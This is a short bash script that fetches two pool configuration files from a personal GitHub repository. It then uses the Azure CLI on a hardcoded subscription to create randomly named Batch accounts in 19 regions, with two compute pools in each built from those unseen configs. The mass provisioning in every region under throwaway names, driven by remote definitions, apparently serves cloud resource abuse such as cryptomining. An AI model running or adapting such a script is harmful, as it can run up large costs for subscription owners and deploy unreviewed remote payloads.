#!/bin/bash
sub="b578e92c-b124-41c0-9fd2-3133a945afaf"
ran=`head /dev/urandom | tr -dc a-z0-9 | fold -w 3 | head -n 1`
wget -O batch.json https://raw.githubusercontent.com/winttr89/batch2/main/batch.json
wget -O batch2.json https://raw.githubusercontent.com/winttr89/batch2/main/batch2.json
az provider register --namespace Microsoft.Batch --subscription "$sub"
az group create --name batchacc$ran --location westus2 --subscription "$sub"
echo "sleep 10s..."
sleep 10s
nnn=`head /dev/urandom | tr -dc a-z0-9 | fold -w 14 | head -n 1`
batch=0
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	echo "Batch account creating...$region"
	batch=$(( $batch + 1 ))
	az batch account create --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --location $region --no-wait
done
echo "sleep 2m..."
sleep 2m
batch=0
echo "Batch account setting..."
for region in australiaeast canadacentral centralindia centralus eastus eastus2 francecentral japaneast koreacentral northeurope southcentralus southeastasia switzerlandnorth uksouth westcentralus westeurope westus westus2 westus3
do
	batch=$(( $batch + 1 ))
	az batch account login --subscription "$sub" --name a$batch$nnn --resource-group batchacc$ran --shared-key-auth
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch.json
	az batch pool create --subscription "$sub" --account-name a$batch$nnn --json-file ./batch2.json
done
echo "Xong..."
